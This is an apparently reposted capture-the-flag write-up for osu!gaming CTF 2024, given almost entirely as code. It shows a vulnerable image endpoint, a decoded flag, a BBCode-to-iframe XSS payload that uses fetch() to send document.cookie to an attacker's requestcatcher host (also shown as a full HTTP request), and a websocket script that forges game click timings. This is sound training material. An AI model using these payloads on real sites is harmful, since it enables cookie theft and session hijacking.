# osu!gaming CTF 2024 writeup

> 原文: https://www.ctfiot.com/165876.html
> ID: 165876


```
app.get("/image", (req, res) => {
 if (req.query.path.split(".")[1] === "png" || req.query.path.split(".")[1] === "jpg") { // only allow images
 res.sendFile(path.resolve('./img/' + req.query.path));
 } else {
 res.status(403).send('Access Denied');
 }
});
```



```
"raw": "nothing to see here \ud83d\udc40\ud83d\udc40 [color=]the flag is b3N1e29rX3Vfc2VlX21lfQ== encoded with base64]"
```



```
const renderBio = (data) => {
 const html = renderBBCode(data);
 const sanitized = purify.sanitize(html);
 // do this after sanitization because otherwise iframe will be removed
 return sanitized.replaceAll(
 /\[youtube\](.+?)\[\/youtube\]/g,
 '<iframe sandbox="allow-scripts" width="640px" height="480px" src="https://www.youtube.com/embed/$1" frameborder="0" allowfullscreen></iframe>'
 );
};
```



```
[youtube]" onload="fetch(`https://[yours].requestcatcher.com/get?${document.cookie}`)" dummy="[/youtube]
```



```
<iframe sandbox="allow-scripts" width="640px" height="480px" src="https://www.youtube.com/embed/" onload="fetch(`https://[yours].requestcatcher.com/get?${document.cookie}`)" dummy="" frameborder="0" allowfullscreen></iframe>
```



```
POST /api/update HTTP/1.1
Host: profile-page.web.osugaming.lol
Content-Length: 189
Content-Type: application/x-www-form-urlencoded
Cookie: csrf=1b979825ce8ef2324cf1c56a9548fd2cbadc7f336dfe70dfe91d691a7e206e3b; connect.sid=s%3A1p3YSt-0ZItsTe-34bLRzqmoiBph99WF.UgL18oVmW2X83tufi0Ao1bXVnoPHbfOaYyEQ6W6349I
csrf: 1b979825ce8ef2324cf1c56a9548fd2cbadc7f336dfe70dfe91d691a7e206e3b
Connection: close

bio=%5byoutube%5d%22%20onload%3d%22fetch(%60https%3a%2f%2f[yours].requestcatcher.com%2fget%3f%24%7bdocument.cookie%7d%60)%22%20dummy%3d%22%5b%2fyoutube%5d
```



```
Game ID: qlbc3
 admin
 cookiezi
Song #1 / 3: xi remixed by cosMo@bousouP - FREEDOM DiVE [METAL DIMENSIONS] (211.11 BPM)
 cookiezi - 211.11 BPM | 20.00 UR 🏆
 admin - 0.00 BPM | 0.00 UR
Song #2 / 3: ke-ji. feat Nanahira - Ange du Blanc Pur (182 BPM)
 cookiezi - 182.00 BPM | 20.00 UR 🏆
 admin - 0.00 BPM | 0.00 UR
Song #3 / 3: xi - Blue Zenith (200 BPM)
 cookiezi - 200.00 BPM | 20.00 UR 🏆
 admin - 0.00 BPM | 0.00 UR
Better luck next time!
```



```
// scoring algorithm
// first judge by whoever has round(bpm) closest to target bpm, if there is a tie, judge by lower UR
/*
session.results[session.round] = session.results[session.round].sort((a, b) => {
 const bpmDeltaA = Math.abs(Math.round(a.bpm) - session.songs[session.round].bpm);
 const bpmDeltaB = Math.abs(Math.round(b.bpm) - session.songs[session.round].bpm);
 if (bpmDeltaA !== bpmDeltaB) return bpmDeltaA - bpmDeltaB;
 return a.ur - b.ur
});
*/
```



```
{"type":"results","data":{"clicks":[],"start":1709344913209,"end":1709344922274}}
```



```
// algorithm from https://ckrisirkc.github.io/osuStreamSpeed.js/newmain.js
const calculate = (start, end, clicks) => {
 const clickArr = [...clicks];
 const bpm = Math.round(((clickArr.length / (end - start) * 60000)/4) * 100) / 100;
 const deltas = [];
 for (let i = 0; i < clickArr.length - 1; i++) {
 deltas.push(clickArr[i + 1] - clickArr[i]);
 }
 const deltaAvg = deltas.reduce((a, b) => a + b, 0) / deltas.length;
 const variance = deltas.map(v => (v - deltaAvg) * (v - deltaAvg)).reduce((a, b) => a + b, 0);
 const stdev = Math.sqrt(variance / deltas.length);

 return { bpm: bpm || 0, ur: stdev * 10 || 0};
};
```



```
from websocket import create_connection
import json
from decimal import *
import time
ws = create_connection("wss://stream-vs.web.osugaming.lol/")

def send_and_recv(payload):
 ws.send(json.dumps(payload))
 return json.loads(ws.recv()) 

send_and_recv({"type":"login","data":"evilman"})
send_and_recv({"type":"challenge"})
songs = send_and_recv({"type":"start"})['data']['songs']
for song in songs:
 start = int(time.time())
 end = start + song['duration'] * 1000
 interval = 60000 / song['bpm'] / 4
 clicks = [start]
 while clicks[-1] + interval <= end:
 clicks.append(clicks[-1] + interval)

 p = {"type":"results","data":{"clicks":clicks,"start":start, "end":end}}
 #print(p)
 send_and_recv(p) # results
 print(ws.recv()) # game or message

 time.sleep(song['duration'])
```
